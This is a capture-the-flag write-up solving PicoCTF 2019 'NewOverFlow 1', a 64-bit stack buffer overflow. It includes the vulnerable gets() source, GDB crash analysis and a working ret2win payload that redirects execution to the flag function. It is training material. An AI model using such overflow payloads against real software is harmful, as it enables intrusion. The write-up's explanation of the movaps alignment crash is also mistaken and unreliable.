# PicoCTF19 NewOverFlow 1

## Challenge

Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this [program](https://2019shell1.picoctf.com/static/37a322b44b57810c3d9334d734bd394b/vuln). You can find it in /problems/newoverflow-1 on the shell server. [Source](https://2019shell1.picoctf.com/static/37a322b44b57810c3d9334d734bd394b/vuln.c).

## Hints

Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes

## Solution

Let's take a look at the directory and copy the executable over to my home directory so I can debug it with GDB without any restrictions.

```bash
samson@pico-2019-shell1:/problems/newoverflow-1$ ls -al
total 96
drwxr-xr-x   2 root       root             4096 Sep 28 21:47 .
drwxr-x--x 684 root       root            69632 Oct 10 18:02 ..
-r--r-----   1 hacksports newoverflow-1_5    50 Sep 28 21:47 flag.txt
-rwxr-sr-x   1 hacksports newoverflow-1_5  8728 Sep 28 21:47 vuln
-rw-rw-r--   1 hacksports hacksports        628 Sep 28 21:47 vuln.c
samson@pico-2019-shell1:/problems/newoverflow-1$ cat vuln.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}

samson@pico-2019-shell1:/problems/newoverflow-1$ cp vuln ~ && pushd . && cd ~
samson@pico-2019-shell1:~$ nano flag.txt
samson@pico-2019-shell1:~$ cat flag.txt 
SAMCTF{NOT_THE_ACTUAL_FLAG}
```

It seems like PicoCTF19 Overflow 1, but it doesn't print the last address it will try to access which in the case of the function `vuln()` will be a return address to `main()`.

```bash
Welcome to 64-bit. Give me a string that gets you the flag: 
A
samson@pico-2019-shell1:~$ echo $(python -c "print 'A'*68") | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
Segmentation fault (core dumped)
```

Okay, no help here. So let's crash it with `gdb`.

```bash
samson@pico-2019-shell1:~$ gdb ./vuln 
... <redacted>
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) x flag
0x400767 <flag>:        0xe5894855
(gdb) r < <(python -c 'print("A"*64+"B"*4+"C"*4+"D"*4+"E"*4)')
Starting program: /home/samson/vuln < <(python -c 'print("A"*64+"B"*4+"C"*4+"D"*4+"E"*4)')
Welcome to 64-bit. Give me a string that gets you the flag: 

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007e7 in vuln ()
(gdb) x/g $sp
0x7fffffffe468: 0x4545454544444444
```

So it seems like we need to overwrite the 'C''s and 'D''s with the flag function address `0x400767`.

```bash
(gdb)  r < <(python -c "print('A'*72+'\x67\x07\x40'+'\x00'*5)")
Starting program: /home/samson/vuln < <(python -c "print('A'*72+'\x67\x07\x40'+'\x00'*5)")
Welcome to 64-bit. Give me a string that gets you the flag: 

Program received signal SIGSEGV, Segmentation fault.
buffered_vfprintf (s=s@entry=0x7ffff7dd0760 <_IO_2_1_stdout_>, format=format@entry=0x7fffffffe418 "SAMCTF{NOT_THE_ACTUAL_FLAG}\n", args=args@entry=0x7fffffffe338) at vfprintf.c:2314
2314    vfprintf.c: No such file or directory.
```

Interesting. An error in GDB. What's the program counter register at?

```bash
(gdb) x/i $pc
=> 0x7ffff7a4266e <buffered_vfprintf+158>:      movaps %xmm0,0x50(%rsp)
```

What's that `movaps` instruction? I've literally never seen that before?
I'll spare you the search results but basically this error is due to the program causing the kernel to jump to the address `0x400767` which is not a valid jump address in `x64`. Otherwise known as a alignment violation. In order to jump properly, I need to jump to an address which is a multiple of 16.

```bash
(gdb) disas flag
Dump of assembler code for function flag:
   0x0000000000400767 <+0>:     push   %rbp
   0x0000000000400768 <+1>:     mov    %rsp,%rbp
   0x000000000040076b <+4>:     sub    $0x50,%rsp
   0x000000000040076f <+8>:     lea    0x172(%rip),%rsi        # 0x4008e8
   0x0000000000400776 <+15>:    lea    0x16d(%rip),%rdi        # 0x4008ea
   0x000000000040077d <+22>:    callq  0x400660 <fopen@plt>
   0x0000000000400782 <+27>:    mov    %rax,-0x8(%rbp)
   0x0000000000400786 <+31>:    cmpq   $0x0,-0x8(%rbp)
   0x000000000040078b <+36>:    jne    0x4007a3 <flag+60>
   0x000000000040078d <+38>:    lea    0x164(%rip),%rdi        # 0x4008f8
   0x0000000000400794 <+45>:    callq  0x4005f0 <puts@plt>
   0x0000000000400799 <+50>:    mov    $0x0,%edi
   0x000000000040079e <+55>:    callq  0x400670 <exit@plt>
   0x00000000004007a3 <+60>:    mov    -0x8(%rbp),%rdx
   0x00000000004007a7 <+64>:    lea    -0x50(%rbp),%rax
   0x00000000004007ab <+68>:    mov    $0x40,%esi
   0x00000000004007b0 <+73>:    mov    %rax,%rdi
   0x00000000004007b3 <+76>:    callq  0x400620 <fgets@plt>
   0x00000000004007b8 <+81>:    lea    -0x50(%rbp),%rax
   0x00000000004007bc <+85>:    mov    %rax,%rdi
   0x00000000004007bf <+88>:    mov    $0x0,%eax
   0x00000000004007c4 <+93>:    callq  0x400610 <printf@plt>
   0x00000000004007c9 <+98>:    nop
   0x00000000004007ca <+99>:    leaveq 
   0x00000000004007cb <+100>:   retq   
End of assembler dump.
```

Well it looks like the first instruction is most likely just pushing the return address on the stack so the program can return to the `main()` function after completing flag. The next instruction seems like it is probably related to the `flag()` function and is a multiple of 16 in hex. So let's try jumping to that address instead.

```bash
samson@pico-2019-shell1:~$ python -c "print('A'*72+'\x68\x07\x40'+'\x00'*5)" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
SAMCTF{NOT_THE_ACTUAL_FLAG}
Segmentation fault (core dumped)
samson@pico-2019-shell1:~$ popd && python -c "print('A'*72+'\x68\x07\x40'+'\x00'*5)" | ./vuln
/problems/newoverflow-1 /problems/newoverflow-1
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_351346a2}
Segmentation fault (core dumped)
```

## Flag

`picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_351346a2}`